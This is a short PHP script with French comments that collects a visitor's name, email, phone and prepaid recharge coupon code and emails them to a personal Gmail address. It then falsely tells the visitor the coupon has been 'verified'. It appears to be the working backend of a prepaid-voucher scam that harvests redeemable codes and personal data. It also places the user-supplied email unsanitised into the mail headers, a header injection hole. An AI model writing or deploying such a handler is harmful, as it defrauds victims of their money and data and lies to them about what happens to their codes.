<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $type = $_POST['type'];
    $amount1 = $_POST['amount1'];
    $code1 = $_POST['code1'];

    // Destinataire de l'email
    $to = "1aliceberton@gmail.com";

    // Sujet de l'email
    $subject = "Nouvelle soumission de coupon";

    // Contenu de l'email
    $message = "Nom & Prénom : $name\n";
    $message .= "Email : $email\n";
    $message .= "Téléphone : $phone\n";
    $message .= "Type de recharge : $type\n";
    $message .= "Montant 1 : $amount1\n";
    $message .= "Code de recharge 1 : $code1\n";

    // Entêtes de l'email
    $headers = "From: $email";

    // Envoyer l'email
    if (mail($to, $subject, $message, $headers)) {
        echo "Votre coupon a été attesté avec succès !";
    } else {
        echo "Erreur lors de l'envoi de l'email. Veuillez réessayer.";
    }
}
?>